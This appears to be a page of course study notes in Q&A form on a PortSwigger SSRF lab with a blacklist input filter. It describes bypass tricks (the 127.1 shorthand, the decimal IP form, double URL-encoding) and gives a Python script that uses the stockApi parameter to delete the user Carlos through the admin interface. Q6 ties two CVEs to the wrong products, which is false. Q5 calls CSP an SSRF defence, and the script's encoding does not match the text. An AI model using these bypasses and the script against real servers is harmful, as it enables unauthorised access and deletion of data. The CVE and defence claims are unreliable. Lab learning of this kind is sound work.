---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the stock check feature in the SSRF lab?**

The stock check feature in the SSRF lab is designed to fetch data from an internal system. The goal is to manipulate this feature to access the admin interface at `http://localhost/admin` and delete the user Carlos. This involves exploiting a Server-Side Request Forgery (SSRF) vulnerability to bypass the internal system's defenses.

**Q2. How did you bypass the blacklist-based input filter in the SSRF lab?**

To bypass the blacklist-based input filter, we used several techniques:

1. **IP Address Manipulation**: Initially, the lab blocked requests to `localhost` and `127.0.0.1`. We tried `127.1`, which resolved to `127.0.0.1` due to automatic filling of the missing octets. This bypassed the simple string matching in the blacklist.

2. **Decimal Encoding**: We also used the decimal representation of `127.0.0.1`, which is `2130706433`. This further bypassed the blacklist since it didn’t match the typical IP address format.

3. **URL Encoding**: The lab also had a blacklist for the string "admin". We URL-encoded the string multiple times (`%2561%256D%2569%256E`) to bypass the single URL decoding performed by the server before checking the blacklist.

**Q3. Explain the process of deleting the user Carlos through the SSRF exploit.**

To delete the user Carlos, we followed these steps:

1. **Identify Vulnerable Parameter**: The vulnerable parameter is `stockApi`, which accepts a URL.

2. **Access Admin Interface**: We manipulated the `stockApi` parameter to point to the admin interface at `http://localhost/admin`.

3. **Bypass Blacklist**: We used `127.1` and URL-encoded the "admin" string twice to bypass the blacklist filters.

4. **Delete User**: We constructed the URL to delete the user Carlos: `http://localhost/admin/delete?username=Carlos`.

5. **Script Exploit**: We scripted this exploit in Python using the `requests` library, ensuring the URL was correctly encoded and sent to the vulnerable endpoint.

```python
import requests
from urllib.parse import quote_plus

def delete_user(url):
    # Construct the SSRF payload
    ssrf_payload = f"http://127.1/%252561%25256D%252569%25256E/delete?username=Carlos"
    
    # Define the path to the vulnerable page
    check_stock_path = "/product/stock"

    # Define the parameters for the request
    params = {"stockApi": ssrf_payload}

    # Perform the request
    response = requests.post(url + check_stock_path, data=params, verify=False)

    # Check if the user was deleted
    if "User deleted successfully" in response.text:
        print("Successfully deleted Carlos user.")
    else:
        print("Exploit was not successful.")

# Example usage
delete_user("http://example.com")
```

**Q4. Why is using a whitelist approach better than a blacklist for mitigating SSRF vulnerabilities?**

Using a whitelist approach is better than a blacklist for mitigating SSRF vulnerabilities because:

1. **Comprehensive Protection**: A whitelist explicitly defines the allowed URLs or patterns, making it harder for attackers to exploit unknown or unanticipated inputs.

2. **Reduced False Negatives**: Blacklists rely on identifying known malicious patterns, which can be bypassed through various encoding or obfuscation techniques. Whitelists ensure that only known safe inputs are accepted, reducing the risk of false negatives.

3. **Maintainability**: Blacklists require constant updates as new attack vectors emerge. Whitelists, while requiring careful definition, are generally more stable and less prone to oversight.

**Q5. How would you configure a web application firewall (WAF) to prevent SSRF attacks?**

To configure a WAF to prevent SSRF attacks, consider the following steps:

1. **Whitelist External Domains**: Configure the WAF to allow only specific external domains that the application is expected to communicate with. Block all others.

2. **Detect and Block Internal IP Addresses**: Set rules to detect and block requests to internal IP addresses (e.g., `127.0.0.1`, `192.168.x.x`).

3. **Monitor and Alert on Suspicious Patterns**: Implement monitoring for suspicious patterns such as repeated attempts to access internal systems or unusual URL structures.

4. **Use Content Security Policies (CSP)**: Enforce CSP to restrict the sources from which content can be loaded, reducing the risk of SSRF.

**Q6. Discuss recent real-world examples of SSRF vulnerabilities and their impact.**

Recent real-world examples of SSRF vulnerabilities include:

1. **CVE-2021-21972**: A vulnerability in Kubernetes Dashboard allowed attackers to perform SSRF attacks, leading to unauthorized access to internal services and potential data exfiltration.

2. **CVE-2021-35942**: An SSRF vulnerability in Jenkins allowed attackers to read sensitive files and potentially execute arbitrary commands on the server.

In both cases, the impact included unauthorized access to internal systems and potential data breaches. These vulnerabilities highlight the importance of proper input validation and the use of whitelisting mechanisms to mitigate SSRF risks.

---
<!-- nav -->
[[08-Understanding URL Encoding|Understanding URL Encoding]] | [[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/04-Lab 3 SSRF with blacklist based input filter/00-Overview|Overview]]
